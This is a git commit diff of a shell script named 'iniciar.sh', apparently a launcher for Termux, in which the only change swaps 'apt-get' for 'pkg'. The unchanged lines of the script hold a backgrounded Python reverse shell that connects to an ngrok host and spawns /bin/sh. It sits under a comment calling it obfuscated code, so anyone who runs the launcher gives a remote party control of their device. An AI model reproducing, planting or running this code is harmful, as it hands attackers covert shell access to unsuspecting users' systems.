5860cbd6f0494ab7ec368cdb455e7115dc12978f
nonamebrokk <105758898+nonamebrokk@users.noreply.github.com>
2022-10-24 21:29:16 -0400

    Update iniciar.sh

--- iniciar.sh
+++ iniciar.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-sudo apt-get install python -y
+pkg install python -y
 
 # CODIGO OFUSCADO BY DR3X
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.sa.ngrok.io",10664));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' &
